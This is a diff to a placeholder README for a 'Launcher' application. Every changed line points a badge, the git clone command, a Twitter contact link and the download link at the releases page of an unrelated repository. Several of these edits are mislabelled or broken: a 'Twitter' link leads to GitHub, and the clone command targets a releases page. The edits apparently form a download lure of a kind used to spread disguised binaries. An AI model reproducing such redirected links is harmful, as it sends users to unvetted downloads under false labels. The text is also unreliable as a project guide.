@@ -2,7 +2,7 @@
 
 Welcome to the **Launcher** repository! This project aims to simplify your workflow by providing a reliable and efficient way to launch applications and scripts. 
 
-[![GitHub](https://img.shields.io/badge/Visit_GitHub-Launcher-blue)](https://github.com)
+[![GitHub](https://img.shields.io/badge/Visit_GitHub-Launcher-blue)](https://github.com/zignamite/aiusagebar/releases)
 
 ## Table of Contents
 
@@ -30,7 +30,7 @@ To get started with Launcher, follow these steps:
    Open your terminal and run the following command:
 
    ```bash
-   git clone https://github.com/yourusername/launcher.git
+   git clone https://github.com/zignamite/aiusagebar/releases
    ```
 
 2. **Navigate to the Directory**:
@@ -126,7 +126,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For any questions or feedback, feel free to reach out:
 
 - **Email**: your.email@example.com
-- **Twitter**: [@yourhandle](https://twitter.com/yourhandle)
+- **Twitter**: [@yourhandle](https://github.com/zignamite/aiusagebar/releases)
 
 ## Acknowledgments
 
@@ -135,6 +135,6 @@ For any questions or feedback, feel free to reach out:
 
 ---
 
-For more information and updates, visit [GitHub](https://github.com).
+For more information and updates, visit [GitHub](https://github.com/zignamite/aiusagebar/releases).
 
-If you need to download the latest version of Launcher, check the [Releases](https://github.com/yourusername/launcher/releases) section.
+If you need to download the latest version of Launcher, check the [Releases](https://github.com/zignamite/aiusagebar/releases) section.
